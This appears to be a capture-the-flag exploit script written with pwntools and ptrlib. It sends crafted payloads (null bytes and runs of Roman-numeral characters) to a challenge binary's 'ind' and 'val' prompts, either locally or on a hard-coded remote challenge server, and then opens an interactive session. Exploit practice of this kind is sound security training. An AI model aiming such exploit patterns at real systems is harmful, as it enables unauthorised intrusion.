#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 10519)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"\x00" * 6
    payload += b"M" * 5
    payload += b"C" * 1
    payload += b"X" * 6
    payload += b"I" * 4

    io.sendlineafter(b"ind: ", payload)

    payload = b""
    payload += b"M" * 4
    payload += b"C" * 8
    payload += b"X" * 5
    payload += b"I" * 4

    io.sendlineafter(b"val: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
